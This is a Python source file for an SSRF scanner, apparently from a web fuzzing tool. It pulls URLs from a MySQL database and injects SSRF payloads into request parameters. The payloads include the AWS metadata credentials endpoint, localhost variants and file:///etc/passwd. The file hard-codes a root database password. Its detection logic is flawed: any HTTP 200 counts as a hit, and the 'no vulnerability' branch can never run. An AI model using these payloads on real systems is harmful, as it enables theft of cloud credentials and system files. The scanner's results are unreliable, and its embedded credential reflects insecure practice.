import requests
import mysql.connector
from urllib.parse import parse_qs, urlparse
import json
from colorama import init, Fore, Style
import re

class SSRF:
    def __init__(self):
        self.payloads = ['http://localhost?file=http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-ec2',
                         'http://127.0.0.1',
                         'http://2130706433',
                         'http://localhost',
                         'http://[0:0:0:0:0:ffff:127.0.0.1]',
                         'http://169.254.169.254/latest/meta-data/',
                         'ftp:///etc/passwd',
                         'file:///etc/passwd',
                         'http://[::]:80',
                         'https://mblogthumb-phinf.pstatic.net/MjAyMTAxMDdfMjE3/MDAxNjEwMDEyMzAzMjI2.sAWMz0e4a_3ZN6Gj1rOumFSUUWHa-uUr388r1hX7sv4g.DN5bE9vCSBb92VmyEMrGWwMfz6l8tDWxBlSMhHAhZlog.JPEG.hiyuns00/IMG_8903.JPG?type=w800',
                         ]

        self.file = open('./payloads/SSRF/ssrf_payloads.txt', 'r')
        self.connection = None
        self.cursor = None

    def get_url(self):
        url_list = []

        try:
            self.connection = mysql.connector.connect(
                host="127.0.0.1",
                database="Fuzzingzzingii",
                user="root",
                password="skawjddns123@"
            )
            if self.connection.is_connected():
                self.cursor = self.connection.cursor()

                self.cursor.execute(f'SELECT url FROM collected_urls;')
                result = self.cursor.fetchall()

                for url in result:
                    url_list.append(url[0])

        except Exception as e:
            print(f"SQL connect error : {e} ")

        return url_list

    def get_params(self, url):
        result = []

        self.cursor.execute('SELECT method, parameters FROM requests WHERE url=%s', (url,))
        result = self.cursor.fetchall()

        return result

    def check_ssrf(self, url, method, param):
        if param:
            param = parse_qs(param)

            for payload in self.payloads:
                for key in param:
                    param[key] = payload

                    if method == 'GET':
                        resp = requests.get(url, params=param)
                        if resp.status_code == 200:
                            return url, method, param

                    elif method == 'POST':
                        resp = requests.post(url, data=param)
                        if resp.status_code == 200:
                            return url, method, param

        return url, method, param

    def execute_ssrf(self, url, method, param, payloads):
        init()
        # SIMPLE
        ssrf_result = self.check_ssrf(url, method, param)

        if ssrf_result:
            url_result, method_result, param_result = ssrf_result

            for payload in payloads:
                payload = payload.strip()
                for key in param_result.keys():
                    param_result[key] = payload

                    if method == 'GET':
                        resp = requests.get(url, params=param_result)
                        if resp.status_code == 200:
                            print(f"{Style.BRIGHT}{Fore.RED}SSRF Vulnerability Found{Style.RESET_ALL}\t method : {method}  URL : {url}\t params : {param_result}\t PAYLOAD : {payload}\t RESULT : TRUE")

                    elif method == 'POST':
                        resp = requests.post(url, data=param_result)
                        if resp.status_code == 200:
                            print(f"{Style.BRIGHT}{Fore.RED}SSRF Vulnerability Found{Style.RESET_ALL}\t method : {method}  URL : {url}\t params : {param_result}\t PAYLOAD : {payload}\t RESULT : TRUE")

        else:
            print(f"{Style.BRIGHT}{Fore.BLUE}!!!\tThere is no SSRF Vulnerability\t!!!{Style.RESET_ALL}")

    def close_file(self):
        self.file.close()
